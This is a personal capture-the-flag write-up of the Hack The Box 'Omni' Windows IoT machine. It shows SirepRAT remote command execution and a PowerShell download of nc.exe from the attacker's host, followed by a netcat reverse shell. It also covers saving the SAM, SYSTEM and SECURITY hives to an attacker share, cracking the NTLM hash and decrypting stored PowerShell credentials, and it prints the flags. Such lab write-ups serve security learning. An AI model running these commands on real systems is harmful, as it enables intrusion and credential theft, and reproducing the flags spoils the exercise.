Box: Windows/Other
Level Easy
### Index
1. Initial Enumeration
2. Initial File Write Access
3. Initial Shell Access

### Initial Enumeration

```
$ nmap -p- --min-rate=1000 -Pn -T4 -sC -sV 10.10.10.204
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 00:40 EDT
Nmap scan report for omni.htb (10.10.10.204)
Host is up (0.041s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 269.12 seconds
```

I tried to access port 8080 but it was prompting me for the password. 
![](Pasted%20image%2020240821222128.png)

Obviously I do not have the password. Upon Digging on the Guided mode, I realized that  the [Sirep Protocol](https://github.com/SafeBreach-Labs/SirepRAT/blob/master/docs/SirepRAT_RCE_as_SYSTEM_on_Windows_IoT_Core_Slides.pdf) is running on the port 20819 and 20820. I would strongly advice to click on the link and go through the PPT. The same link has a .py file which is an exploit I used to get an initial access of our target. This is unusual Windows Box. 

### Initial File Write Access

Upon running the exploit on the target, I first validate that if I am allowed to write something on the target or not.  Here is the Exploit Help
```
──(ringbuffer㉿kali)-[~/Downloads/Omni.htb/SirepRAT]
└─$ python SirepRAT.py --help                                                                      
usage: SirepRAT.py target_device_ip command_type [options]

Exploit Windows IoT Core's Sirep service to execute remote commands on the device

positional arguments:
  target_device_ip      The IP address of the target IoT Core device
  command_type          The Sirep command to use. Available commands are listed below

options:
  -h, --help            show this help message and exit
  --return_output       Set to have the target device return the command output stream
  --cmd CMD             Program path to execute
  --as_logged_on_user   Set to impersonate currently logged on user on the target device
  --args ARGS           Arguments string for the program
  --base_directory BASE_DIRECTORY
                        The working directory from which to run the desired program
  --remote_path REMOTE_PATH
                        Path on target device
  --data DATA           Data string to write to file
  --v                   Verbose - if printable, print result
  --vv                  Very verbose - print socket buffers and more

available commands:
*       LaunchCommandWithOutput
*       PutFileOnDevice
*       GetFileFromDevice
*       GetFileInformationFromDevice
*       GetSystemInformationFromDevice

remarks:
-       Use moustaches to wrap remote environment variables to expand (e.g. {{userprofile}})

Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C:\Windows\System32\hostname.exe

```

Now making sure if I am allowed to write the file or not.

```
┌──(ringbuffer㉿kali)-[~/Downloads/Omni.htb/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\Windows\Temp\test.txt" --data "Hello TESTER"
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
                                                                                                                                                                        
┌──(ringbuffer㉿kali)-[~/Downloads/Omni.htb/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\Temp\test.txt" --v                
---------

---------
---------
Hello TESTER
---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<FileResult | type: 31, payload length: 4012, payload peek: 'b'H\x00e\x00l\x00l\x00o\x00 \x00T\x00E\x00S\x00T\x00E\x00R\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00''>

```

Write Successful.

### Initial Shell Access

I tried to run `cmd.exe` using the same exploit code but the output was not in my favor.
```
┌──(ringbuffer㉿kali)-[~/Downloads/Omni.htb/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --return_output
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 125, payload peek: 'b'Microsoft Windows [Version 10.0.17763.107]\r\nCopyri''>

```

You can see that it just print the first few words `Microsoft Windows...` and nothing else. I couldn't ran the `dir` or `whoami` command. I started a python web server and got the `nc64.exe` up there on the target in `C:\tmp` folder and got my initial shell.

```
$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c mkdir C:\tmp\'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 48, payload peek: 'b'A subdirectory or file C:\\tmp\\ already exists.\r\n''>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x01\x00\x00\x00''>

┌──(ringbuffer㉿kali)-[~/Downloads/Omni.htb/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c powershell Invoke-WebRequest -outfile c:\tmp\nc.exe -uri http://10.10.14.4/nc.exe'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
                                                                                                                                                                        
┌──(ringbuffer㉿kali)-[~/Downloads/Omni.htb/SirepRAT]
└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c c:\tmp\nc.exe -e cmd 10.10.14.4 4444'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

Upon Executing the last command, the NetCat Listener was running. Okay now for this machine, I looked up the whole Write Up. So from here, all the work I did is with the help of Writeup. I hate doing it but I was stuck really bad on this one. 

Using the following set of commands, I was able to obtained the `SAM`, `SYSTEM` and `SECURITY` registry hives from the target to my own machine.

```
$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c reg save HKLM\system \\10.10.14.4\a\system'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>

$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c reg save HKLM\security \\10.10.14.4\a\security'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>

$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c reg save HKLM\sam \\10.10.14.4\a\sam'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 40, payload peek: 'b'The operation completed successfully.\r\r\n''>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>

```

Following to that, I copied the hash line from the SAM file into a new txt file. 
```
$ more sam_hash.txt 
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::

$ hashcat -m 1000 -a 0 sam_hash.txt /usr/share/wordlists/rockyou.txt --show
e3cb0651718ee9b4faffe19a51faff95:mesh5143                 

```

Okay so I got the password for the user app. Now opening the http://10.10.10.204:8080/ the above credentials for the user `app` will work.
![](Pasted%20image%2020240821235550.png)

Under the Process, Using Run Command, I ran the NetCat again and catch the Shell for user `app`. At this point, I was able to see that the flag in the "C:\\Data\\User\\App" directory is encrypted. I don't know about this PowerShell cmdlet that can decrypt the flag.

```
PS C:\Data\Users\app> (Import-CliXml -Path user.txt).GetNetworkCredential().Password
(Import-CliXml -Path user.txt).GetNetworkCredential().Password
7cfd50f6bc34db3204898f1505ad9d70
PS C:\Data\Users\app> 

```

That was our User Flag. Upon digging the same directory, there were two more interesting files. 
```
PS C:\Data\Users\app> dir

Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---         7/4/2020   7:28 PM                3D Objects                    
d-r---         7/4/2020   7:28 PM                Documents                     
d-r---         7/4/2020   7:28 PM                Downloads                     
d-----         7/4/2020   7:28 PM                Favorites                     
d-r---         7/4/2020   7:28 PM                Music                         
d-r---         7/4/2020   7:28 PM                Pictures                      
d-r---         7/4/2020   7:28 PM                Videos                        
-ar---         7/4/2020   8:20 PM            344 hardening.txt                 
-ar---         7/4/2020   8:14 PM           1858 iot-admin.xml                 
-ar---         7/4/2020   9:53 PM           1958 user.txt                      
```

Have a look at the `hardening.txt` file.
```
PS C:\Data\Users\app> type hardening.txt
type hardening.txt
- changed default administrator password of "p@ssw0rd"
- added firewall rules to restrict unnecessary services
- removed administrator account from "Ssh Users" group
```

Second the iot-admin.xml
```
PS C:\Data\Users\app> type iot-admin.xml
type iot-admin.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">omni\administrator</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27</SS>
    </Props>
  </Obj>
</Objs>
PS C:\Data\Users\app> 

```

Again the password (root flag) is encrypted with the same method as user flag. Let's try it out.

```
PS C:\Data\Users\app> (Import-CliXml -Path iot-admin.xml).GetNetworkCredential() | fl
(Import-CliXml -Path iot-admin.xml).GetNetworkCredential() | fl


UserName : administrator
Password : _1nt3rn37ofTh1nGz
Domain   : omni

```

i will close the browser windows and open it again. But this time I will login with the above administrator credentials. you might need to clear cache and history.

Again run the NetCat Shell same way.

![](Pasted%20image%2020240822001343.png)

Decoding the root flag.

```
PS C:\Data\Users\administrator> (Import-CliXml -Path root.txt).GetNetworkCredential() | fl
(Import-CliXml -Path root.txt).GetNetworkCredential() | fl


UserName : flag
Password : 5dbdce5569e2c4708617c0ce6e9bf11d
Domain   : 

```
